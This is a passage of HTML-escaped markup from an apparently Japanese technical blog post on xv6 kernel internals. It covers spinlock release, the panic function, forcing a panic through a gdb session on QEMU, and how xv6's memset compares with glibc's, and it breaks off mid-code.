  &lt;span class=&quot;token keyword&quot;&gt;asm&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;volatile&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;movl $0, %0&quot;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;+m&quot;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;lk&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;locked&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

  &lt;span class=&quot;token function&quot;&gt;popcli&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;最後の&lt;code class=&quot;language-text&quot;&gt;asm volatile(&quot;movl $0, %0&quot; : &quot;+m&quot; (lk-&gt;locked) : );&lt;/code&gt;の行で&lt;code class=&quot;language-text&quot;&gt;locked&lt;/code&gt;に0を設定し、ロックを解除しています。&lt;/p&gt;
&lt;h2 id=&quot;おまけデバッガでpanic関数を呼び出してみる&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%81%8A%E3%81%BE%E3%81%91%E3%83%87%E3%83%90%E3%83%83%E3%82%AC%E3%81%A7panic%E9%96%A2%E6%95%B0%E3%82%92%E5%91%BC%E3%81%B3%E5%87%BA%E3%81%97%E3%81%A6%E3%81%BF%E3%82%8B&quot; aria-label=&quot;おまけデバッガでpanic関数を呼び出してみる permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;おまけ：デバッガでpanic関数を呼び出してみる&lt;/h2&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;panic&lt;/code&gt;関数は&lt;code class=&quot;language-text&quot;&gt;console.c&lt;/code&gt;で定義されています。&lt;/p&gt;
&lt;p&gt;CPU割込みを禁止した上で無限ループを発生させて、これ以上処理が行われないようにしているようです。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;panic&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;s&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; i&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  uint pcs&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

  &lt;span class=&quot;token function&quot;&gt;cli&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  cons&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;locking &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token comment&quot;&gt;// use lapiccpunum so that we can call panic from mycpu()&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;cprintf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;lapicid %d: panic: &quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;lapicid&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;cprintf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;cprintf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;getcallerpcs&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;s&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; pcs&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;i&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; i&lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; i&lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;cprintf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot; %p&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; pcs&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;i&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  panicked &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token comment&quot;&gt;// freeze other CPU&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;実際に何が出力されるのか確認するために、gdbで&lt;code class=&quot;language-text&quot;&gt;panic&lt;/code&gt;を発生させてみることにしました。&lt;/p&gt;
&lt;p&gt;gdbで以下のコマンドを順に実行していきます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;# QEMUに接続してpanic関数を呼び出す直前にブレークポイントを設定&lt;/span&gt;
$ target remote localhost:26000
$ b *0x80102499
$ &lt;span class=&quot;token builtin class-name&quot;&gt;continue&lt;/span&gt;

&lt;span class=&quot;token comment&quot;&gt;# panic関数を呼び出すようにフラグレジスタを改ざんして実行&lt;/span&gt;
$ info registers eflags
eflags         0x93                &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;token assign-left variable&quot;&gt;IOPL&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt; SF AF CF &lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;
$ &lt;span class=&quot;token builtin class-name&quot;&gt;set&lt;/span&gt; &lt;span class=&quot;token variable&quot;&gt;$CF&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;
$ &lt;span class=&quot;token builtin class-name&quot;&gt;set&lt;/span&gt; &lt;span class=&quot;token variable&quot;&gt;$eflags&lt;/span&gt; ^&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;token variable&quot;&gt;$CF&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
$ info registers eflags
eflags         0x92                &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;token assign-left variable&quot;&gt;IOPL&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt; SF AF &lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;
$ &lt;span class=&quot;token builtin class-name&quot;&gt;continue&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;これでQEMUのコンソールを確認したところ、&lt;code class=&quot;language-text&quot;&gt;kfree&lt;/code&gt;関数の呼び出し時に&lt;code class=&quot;language-text&quot;&gt;panic&lt;/code&gt;が呼び出されたことがわかります。&lt;/p&gt;
&lt;p&gt;最後の行に表示されているアドレスはリターンアドレスのスタックっぽいです。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/9bc48ed77bce6b2d38a68302fb1be28e/0b533/image-19.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 63.74999999999999%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAYAAACpUE5eAAAACXBIWXMAARlAAAEZQAGA43XUAAABYUlEQVQ4y62QuU7DQBRFx/vuOAUSxIkxW4NEAYiA4AdoKLIREiBiKyko6PiPJDjC8Z9e5nlJUiAESoqjuX4jn7kz7KbTRK/dQK/TQP+6OYfmfPZ438f72ysGvQ5uuy3cdds/0MLzwwBPl3Wwr2mCKIoQTSaI4xhJkmDKZ7TSd7E3Hn9iNBrnjBYyZzjEJE7w8dIG03QDqqJA0zTIspyi6zoMw0hnAmNgOYIgQCREMc0FNKP9gzUZTNXoZx2qqs4klmml2bZtWJaVYhomHMeB67rwPG+WMxwuFHC4oYMJogRJkqDwlgRlttDqPxxVDLCd3T34vo/trW0EQYAwDNMG1JjaEnTQb6LiWY5JqPOrGPmbFW9HVyRRIf2r8MQ3aWVYlkJYr1qZUFiR8LRmrbbhWWDPGy6DKGTCi9BeTcOCcxKu2zIqTo6rwOdUSxm1kprhZQQFZS2D501OyLPvqrjaL+MbS5xJroG2sO4AAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/9bc48ed77bce6b2d38a68302fb1be28e/8ac56/image-19.webp 240w,
/static/9bc48ed77bce6b2d38a68302fb1be28e/d3be9/image-19.webp 480w,
/static/9bc48ed77bce6b2d38a68302fb1be28e/b0a15/image-19.webp 500w&quot;
              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/9bc48ed77bce6b2d38a68302fb1be28e/8ff5a/image-19.png 240w,
/static/9bc48ed77bce6b2d38a68302fb1be28e/e85cb/image-19.png 480w,
/static/9bc48ed77bce6b2d38a68302fb1be28e/0b533/image-19.png 500w&quot;
            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/9bc48ed77bce6b2d38a68302fb1be28e/0b533/image-19.png&quot;
            alt=&quot;img&quot;
            title=&quot;img&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&quot;おまけmemsetについて&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%81%8A%E3%81%BE%E3%81%91memset%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6&quot; aria-label=&quot;おまけmemsetについて permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;おまけ：memsetについて&lt;/h2&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;memset&lt;/code&gt;は&lt;code class=&quot;language-text&quot;&gt;string.c&lt;/code&gt;で以下のように定義されています。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;memset&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;dst&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; c&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; uint n&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;dst&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; n&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    c &lt;span class=&quot;token operator&quot;&gt;&amp;amp;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0xFF&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;stosl&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;dst&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;token operator&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;token operator&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;token operator&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt;c&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; n&lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;else&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;stosb&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;dst&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; c&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; n&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; dst&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;memset&lt;/code&gt;は、任意のメモリ領域に値を書き込むことのできる関数ですが、以下のglibの&lt;code class=&quot;language-text&quot;&gt;memset&lt;/code&gt;とは実装が異なるように見えます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;
inhibit_loop_to_libcall
&lt;span class=&quot;token function&quot;&gt;memset&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;dstpp&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; c&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;size_t&lt;/span&gt; len&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; dstp &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; dstpp&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

  &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;len &lt;span class=&quot;token operator&quot;&gt;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;token class-name&quot;&gt;size_t&lt;/span&gt; xlen&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;token class-name&quot;&gt;op_t&lt;/span&gt; cccc&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

      cccc &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; c&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
      cccc &lt;span class=&quot;token operator&quot;&gt;|=&lt;/span&gt; cccc &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
      cccc &lt;span class=&quot;token operator&quot;&gt;|=&lt;/span&gt; cccc &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;OPSIZ &lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;token comment&quot;&gt;/* Do the shift in two steps to avoid warning if long has 32 bits.  */&lt;/span&gt;
	cccc &lt;span class=&quot;token operator&quot;&gt;|=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;cccc &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

      &lt;span class=&quot;token comment&quot;&gt;/* There are at least some bytes to set.
	 No need to test for LEN == 0 in this alignment loop.  */&lt;/span&gt;
      &lt;span class=&quot;token keyword&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;dstp &lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt; OPSIZ &lt;span class=&quot;token operator&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
	  &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;byte &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; dstp&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; c&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
	  dstp &lt;span class=&quot;token operator&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
	  len &lt;span class=&quot;token operator&quot;&gt;-=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;

      &lt;span class=&quot;token comment&quot;&gt;/* Write 8 `op_t&apos; per iteration until less than 8 `op_t&apos; remain.  */&lt;/span&gt;
      xlen &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; len &lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;OPSIZ &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;token keyword&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;xlen &lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
	  &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;op_t&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; dstp&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; cccc&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
